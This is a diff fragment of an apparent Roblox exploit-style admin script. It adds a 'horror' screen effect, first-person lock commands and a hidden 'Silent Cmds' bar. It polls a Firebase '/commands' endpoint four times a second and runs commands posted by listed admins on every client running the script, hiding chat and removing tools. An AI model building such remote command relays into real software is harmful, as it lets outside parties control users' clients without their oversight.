+            Lighting.Ambient = Color3.fromRGB(110, 110, 110)
+            Lighting.OutdoorAmbient = Color3.fromRGB(90, 90, 90)
+            Lighting.FogStart = 10
+            Lighting.FogEnd = 70
+            Lighting.FogColor = Color3.fromRGB(80, 85, 90)
+
+            pcall(function()
+                for _, eff in ipairs(Lighting:GetChildren()) do
+                    if eff:IsA("PostEffect") or eff:IsA("Atmosphere") then eff:Destroy() end
+                end
+
+                local cc = Instance.new("ColorCorrectionEffect", Lighting)
+                cc.Name = "IsaevaHorrorCC"
+                cc.Saturation = -1
+                cc.Contrast = 0.45
+                cc.Brightness = 0.02
+                cc.TintColor = Color3.fromRGB(240, 245, 255)
+
+                local atmos = Instance.new("Atmosphere", Lighting)
+                atmos.Name = "IsaevaHorrorAtmos"
+                atmos.Density = 0.65
+                atmos.Offset = 0
+                atmos.Color = Color3.fromRGB(100, 105, 110)
+                atmos.Decay = Color3.fromRGB(50, 50, 50)
+                atmos.Glare = 0
+                atmos.Haze = 5
+            end)
+
+            for _, oldSnd in ipairs(SoundService:GetChildren()) do
+                if string.sub(oldSnd.Name, 1, 12) == "IsaevaHorror" then oldSnd:Destroy() end
+            end
+
+            local bgAmbience = Instance.new("Sound", SoundService)
+            bgAmbience.Name = "IsaevaHorrorAmbience"
+            bgAmbience.SoundId = "rbxassetid://1843536298"
+            bgAmbience.Looped = true
+            bgAmbience.Volume = 0.35
+            bgAmbience:Play()
+
+            local randomScareSnd = Instance.new("Sound", SoundService)
+            randomScareSnd.Name = "IsaevaHorrorStinger"
+            randomScareSnd.SoundId = "rbxassetid://9114221735"
+            randomScareSnd.Volume = 0.9
+
+            local backpack = LocalClient:FindFirstChildOfClass("Backpack")
+            if backpack then
+                originalBackpackItems = {}
+                for _, item in ipairs(backpack:GetChildren()) do
+                    table.insert(originalBackpackItems, item:Clone())
+                    item:Destroy()
+                end
+            end
+            local char = LocalClient.Character
+            if char then
+                for _, item in ipairs(char:GetChildren()) do
+                    if item:IsA("Tool") then
+                        table.insert(originalBackpackItems, item:Clone())
+                        item:Destroy()
+                    end
+                end
+            end
+
+            pcall(function()
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+            end)
+
+            local pGui = LocalClient:FindFirstChild("PlayerGui")
+            if pGui then
+                if pGui:FindFirstChild("IsaevaHorrorGui") then pGui.IsaevaHorrorGui:Destroy() end
+
+                local hGui = Instance.new("ScreenGui", pGui)
+                hGui.Name = "IsaevaHorrorGui"
+                hGui.IgnoreGuiInset = true
+                hGui.DisplayOrder = 999998
+
+                local vignette = Instance.new("ImageLabel", hGui)
+                vignette.Name = "Vignette"
+                vignette.Size = UDim2.new(1, 0, 1, 0)
+                vignette.BackgroundTransparency = 1
+                vignette.Image = "rbxassetid://237514333"
+                vignette.ImageColor3 = Color3.fromRGB(0, 0, 0)
+                vignette.ImageTransparency = 0.35
+
+                local blood1 = Instance.new("ImageLabel", hGui)
+                blood1.Name = "Blood1"
+                blood1.Size = UDim2.new(0, 250, 0, 250)
+                blood1.Position = UDim2.new(0.05, 0, 0.1, 0)
+                blood1.BackgroundTransparency = 1
+                blood1.Image = "rbxassetid://237514333"
+                blood1.ImageColor3 = Color3.fromRGB(90, 0, 0)
+                blood1.ImageTransparency = 0.25
+
+                local blood2 = Instance.new("ImageLabel", hGui)
+                blood2.Name = "Blood2"
+                blood2.Size = UDim2.new(0, 300, 0, 300)
+                blood2.Position = UDim2.new(0.7, 0, 0.55, 0)
+                blood2.BackgroundTransparency = 1
+                blood2.Image = "rbxassetid://237514333"
+                blood2.ImageColor3 = Color3.fromRGB(90, 0, 0)
+                blood2.ImageTransparency = 0.3
+
+                local scanline = Instance.new("Frame", hGui)
+                scanline.Name = "Scanline"
+                scanline.Size = UDim2.new(1, 0, 0, 3)
+                scanline.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                scanline.BackgroundTransparency = 0.8
+                scanline.BorderSizePixel = 0
+
+                if activeHorrorLoop then activeHorrorLoop:Disconnect() end
+                local nextRandomScare = tick() + math.random(4, 10)
+
+                activeHorrorLoop = RunService.RenderStepped:Connect(function()
+                    local now = tick()
+                    local currentCam = workspace.CurrentCamera
+
+                    local localChar = LocalClient.Character
+                    local hum = localChar and localChar:FindFirstChildOfClass("Humanoid")
+                    local rootPart = localChar and localChar:FindFirstChild("HumanoidRootPart")
+                    if hum and rootPart and hum.MoveDirection.Magnitude > 0 then
+                        for _, desc in ipairs(localChar:GetDescendants()) do
+                            if desc:IsA("Sound") and (string.find(string.lower(desc.Name), "foot") or string.find(string.lower(desc.SoundId), "foot")) then
+                                desc.Volume = 4.0
+                            end
+                        end
+                    end
+
+                    if currentCam then
+                        local glitchTrigger = (math.random(1, 120) == 1)
+                        scanline.Position = UDim2.new(0, 0, 0, math.random(0, 600))
+                        currentCam.FieldOfView = 70 + (glitchTrigger and math.random(-8, 8) or 0)
+                    end
+
+                    if now >= nextRandomScare then
+                        nextRandomScare = now + math.random(6, 14)
+                        task.spawn(function()
+                            randomScareSnd.PlaybackSpeed = math.random(60, 120) / 100
+                            randomScareSnd:Play()
+
+                            scanline.BackgroundTransparency = 0.15
+                            if currentCam then
+                                currentCam.CFrame = currentCam.CFrame * CFrame.Angles(math.rad(math.random(-6, 6)), math.rad(math.random(-10, 10)), 0)
+                            end
+                            task.wait(0.08)
+                            scanline.BackgroundTransparency = 0.8
+                        end)
+                    end
+                end)
+            end
+        elseif activeCmd == "unhorror" then
+            clearHorror()
+        elseif activeCmd == "firstperson" then
+            LocalClient.CameraMinZoomDistance = 0.5
+            LocalClient.CameraMaxZoomDistance = 0.5
+            LocalClient.CameraMode = Enum.CameraMode.LockFirstPerson
+        elseif activeCmd == "unfirstperson" then
+            LocalClient.CameraMinZoomDistance = 0.5
+            LocalClient.CameraMaxZoomDistance = 400
+            LocalClient.CameraMode = Enum.CameraMode.Classic
+        end
+    end
+
+    local processedKeys = {}
+    local isInitialLoad = true
+
+    local function pollFirebase()
+        local raw = FirebaseCall("GET", "/commands")
+        if raw and raw ~= "null" then
+            local data = HttpService:JSONDecode(raw)
+            if type(data) == "table" then
+                if isInitialLoad then
+                    for key in pairs(data) do
+                        processedKeys[key] = true
+                    end
+                    isInitialLoad = false
+                    return
+                end
+
+                local ordered = {}
+                for key, cmdInfo in pairs(data) do
+                    if type(cmdInfo) == "table" and not processedKeys[key] then
+                        table.insert(ordered, {
+                            key = key,
+                            info = cmdInfo,
+                            ts = tonumber(cmdInfo.time) or 0,
+                        })
+                    end
+                end
+
+                table.sort(ordered, function(a, b)
+                    return a.ts < b.ts
+                end)
+
+                for _, entry in ipairs(ordered) do
+                    processedKeys[entry.key] = true
+                    local age = os.time() - entry.ts
+                    if age >= -10 and age <= 60 then
+                        executeCommand(entry.info.sender, entry.info.cmd, entry.info.target, entry.info.args)
+                    end
+                end
+            end
+        else
+            isInitialLoad = false
+        end
+    end
+
+    task.spawn(function()
+        while true do
+            task.wait(0.25)
+            pcall(pollFirebase)
+        end
+    end)
+
+    local function sendCommand(rawMessageText)
+        if not isUserAdmin(LocalClient.UserId) then return end
+        local messageText = sanitizeText(rawMessageText)
+        if string.sub(messageText, 1, #PREFIX) ~= PREFIX then
+            messageText = PREFIX .. messageText
+        end
+        local cleanMessage = string.sub(messageText, #PREFIX + 1)
+        local commandArgs = {}
+        for word in string.gmatch(cleanMessage, "[^%s]+") do
+            table.insert(commandArgs, word)
+        end
+        local activeCmd = string.lower(commandArgs[1] or "")
+        local targetNameQuery = commandArgs[2] or ""
+
+        if activeCmd == "" then return end
+
+        local nowTs = os.time()
+        local payload = {
+            sender = LocalClient.UserId,
+            cmd = activeCmd,
+            target = targetNameQuery,
+            args = commandArgs,
+            time = nowTs,
+        }
+
+        local res = FirebaseCall("POST", "/commands", payload)
+        if res then
+            pcall(function()
+                local decoded = HttpService:JSONDecode(res)
+                if type(decoded) == "table" and decoded.name then
+                    processedKeys[decoded.name] = true
+                end
+            end)
+        end
+
+        executeCommand(LocalClient.UserId, activeCmd, targetNameQuery, commandArgs)
+    end
+
+    local function handleIncomingChat(rawMsg)
+        local clean = sanitizeText(rawMsg)
+        if clean == "" then return end
+        local lowerClean = string.lower(clean)
+
+        if lowerClean == PREFIX .. "cmdbar" or lowerClean == PREFIX .. "mobilebar" then
+            if isUserAdmin(LocalClient.UserId) then
+                setMobileToggleVisible(true)
+                setMobileBarVisible(true)
+            end
+            return
+        end
+
+        if string.sub(clean, 1, #PREFIX) == PREFIX and isUserAdmin(LocalClient.UserId) then
+            sendCommand(clean)
+        end
+    end
+
+    pcall(function()
+        LocalClient.Chatted:Connect(function(msg)
+            handleIncomingChat(msg)
+        end)
+    end)
+
+    pcall(function()
+        if TextChatService and TextChatService.MessageReceived then
+            TextChatService.MessageReceived:Connect(function(textChatMessage)
+                if textChatMessage and textChatMessage.TextSource and textChatMessage.TextSource.UserId == LocalClient.UserId then
+                    handleIncomingChat(textChatMessage.Text or "")
+                end
+            end)
+        end
+    end)
+
+    local container = getGuiContainer()
+    local oldBar = container:FindFirstChild("IsaevaSilentBar") or CoreGui:FindFirstChild("IsaevaSilentBar")
+    if oldBar then oldBar:Destroy() end
+
+    local barGui = Instance.new("ScreenGui")
+    barGui.Name = "IsaevaSilentBar"
+    barGui.ResetOnSpawn = false
+    barGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    barGui.DisplayOrder = 2147483647
+    barGui.Parent = container
+
+    local function styleWhiteOutlinedText(obj)
+        obj.TextColor3 = Color3.fromRGB(255, 255, 255)
+        obj.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+        obj.Font = Enum.Font.GothamMedium
+        local outline = Instance.new("UIStroke")
+        outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+        outline.Color = Color3.fromRGB(0, 0, 0)
+        outline.Thickness = 1.5
+        outline.Parent = obj
+    end
+
+    local box = Instance.new("TextBox")
+    box.Name = "SilentBox"
+    box.Size = UDim2.new(0, 280, 0, 32)
+    box.Position = UDim2.new(0.5, -140, 0, 12)
+    box.BackgroundColor3 = Color3.fromRGB(14, 15, 24)
+    box.BackgroundTransparency = 0.15
+    box.PlaceholderText = "Silent Cmds"
+    box.Text = ""
+    box.TextSize = 12
+    box.ClearTextOnFocus = false
+    box.Visible = false
+    box.ZIndex = 10
+    box.Parent = barGui
+    silentBox = box
+    styleWhiteOutlinedText(box)
+
+    local boxCorner = Instance.new("UICorner")
+    boxCorner.CornerRadius = UDim.new(0, 8)
+    boxCorner.Parent = box
+
+    local boxStroke = Instance.new("UIStroke")
+    boxStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    boxStroke.Color = Color3.fromRGB(255, 255, 255)
+    boxStroke.Thickness = 1.2
+    boxStroke.Parent = box
+
+    UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+        if not isUserAdmin(LocalClient.UserId) then return end
+        if input.KeyCode == Enum.KeyCode.F2 or input.KeyCode == Enum.KeyCode.RightShift then
+            box.Visible = not box.Visible
+            if box.Visible then
+                task.defer(function()
+                    box:CaptureFocus()
+                end)
+            else
+                box:ReleaseFocus()
+            end
+        end
+    end)
+
+    box.FocusLost:Connect(function(enterPressed)
+        local cmdText = box.Text
+        box.Text = ""
+        box.Visible = false
+        if enterPressed and cmdText ~= "" and isUserAdmin(LocalClient.UserId) then
+            sendCommand(cmdText)
+        end
+    end)
+
+    -- Draggable Mobile Toggle Pill + Close "X" + Mobile Silent Cmds Input Box
+    local toggleHolder = Instance.new("Frame")
+    toggleHolder.Name = "MobileToggleHolder"
+    toggleHolder.Size = UDim2.new(0, 132, 0, 34)
+    toggleHolder.Position = UDim2.new(0.5, -66, 0, 56)
+    toggleHolder.BackgroundColor3 = Color3.fromRGB(14, 15, 24)
+    toggleHolder.BackgroundTransparency = 0.15
+    toggleHolder.Active = true
+    toggleHolder.Draggable = true
+    toggleHolder.Visible = false
+    toggleHolder.ZIndex = 15
+    toggleHolder.Parent = barGui
+    mobileToggleFrame = toggleHolder
+
+    local toggleCorner = Instance.new("UICorner")
+    toggleCorner.CornerRadius = UDim.new(0, 8)
+    toggleCorner.Parent = toggleHolder
+
+    local toggleBorder = Instance.new("UIStroke")
+    toggleBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    toggleBorder.Color = Color3.fromRGB(255, 255, 255)
+    toggleBorder.Thickness = 1.2
+    toggleBorder.Parent = toggleHolder
+
+    local toggleBtn = Instance.new("TextButton")
+    toggleBtn.Name = "ToggleBtn"
+    toggleBtn.Size = UDim2.new(1, -30, 1, 0)
+    toggleBtn.Position = UDim2.new(0, 0, 0, 0)
+    toggleBtn.BackgroundTransparency = 1
+    toggleBtn.Text = "Silent Cmds"
+    toggleBtn.TextSize = 12
+    toggleBtn.ZIndex = 16
+    toggleBtn.Parent = toggleHolder
+    styleWhiteOutlinedText(toggleBtn)
+
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Name = "CloseBtn"
+    closeBtn.Size = UDim2.new(0, 28, 1, 0)
+    closeBtn.Position = UDim2.new(1, -28, 0, 0)
+    closeBtn.BackgroundTransparency = 1
+    closeBtn.Text = "X"
+    closeBtn.TextSize = 13
+    closeBtn.ZIndex = 16
+    closeBtn.Parent = toggleHolder
+    styleWhiteOutlinedText(closeBtn)
+
+    local mBox = Instance.new("TextBox")
+    mBox.Name = "MobileSilentBox"
+    mBox.Size = UDim2.new(0, 260, 0, 34)
+    mBox.Position = UDim2.new(0.5, -130, 0, 98)
+    mBox.BackgroundColor3 = Color3.fromRGB(14, 15, 24)
+    mBox.BackgroundTransparency = 0.15
+    mBox.PlaceholderText = "Silent Cmds"
+    mBox.Text = ""
+    mBox.TextSize = 12
+    mBox.ClearTextOnFocus = false
+    mBox.Visible = false
+    mBox.ZIndex = 18
+    mBox.Parent = barGui
+    mobileBarBox = mBox
+    styleWhiteOutlinedText(mBox)
+
+    local mCorner = Instance.new("UICorner")
+    mCorner.CornerRadius = UDim.new(0, 8)
+    mCorner.Parent = mBox
+
+    local mBorder = Instance.new("UIStroke")
+    mBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    mBorder.Color = Color3.fromRGB(255, 255, 255)
+    mBorder.Thickness = 1.2
+    mBorder.Parent = mBox
+
+    toggleBtn.MouseButton1Click:Connect(function()
+        if not isUserAdmin(LocalClient.UserId) then return end
+        setMobileBarVisible(not mBox.Visible)
+    end)
+
+    closeBtn.MouseButton1Click:Connect(function()
+        setMobileToggleVisible(false)
+    end)
+
+    mBox.FocusLost:Connect(function(enterPressed)
+        local cmdText = mBox.Text
+        mBox.Text = ""
+        mBox.Visible = false
+        if enterPressed and cmdText ~= "" and isUserAdmin(LocalClient.UserId) then
+            sendCommand(cmdText)
+        end
+    end)
+end)
